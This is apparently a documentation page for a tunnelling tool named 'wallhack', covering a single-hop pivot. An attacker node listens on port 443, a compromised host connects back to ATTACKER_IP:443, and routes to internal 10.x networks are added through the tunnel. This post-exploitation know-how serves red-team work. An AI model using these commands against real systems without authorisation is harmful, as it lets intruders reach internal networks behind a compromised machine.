# Single Hop

The most common deployment scenario. Establish a direct tunnel between an entry node and a single compromised host.

{% steps %}
{% step title="Attacker (Entry)" number=1 %}
Listen for incoming connections on port 443.

{% codeblock code="wallhack entry --listen :443" /%}
{% /step %}

{% step title="Compromised Host (Exit)" number=2 %}
Connect back to the attacker.

{% codeblock code="./wallhack exit --connect ATTACKER_IP:443" /%}
{% /step %}

{% step title="Configure Routes" number=3 %}
Add routes for target networks through the tunnel interface.

```bash
ip route add 10.0.0.0/24 dev tun0
ip route add 10.1.0.0/24 dev tun0
```
{% /step %}
{% /steps %}

{% trafficflow flow="Your machine -> Compromised host -> Target network" label="Traffic Flow:" /%}
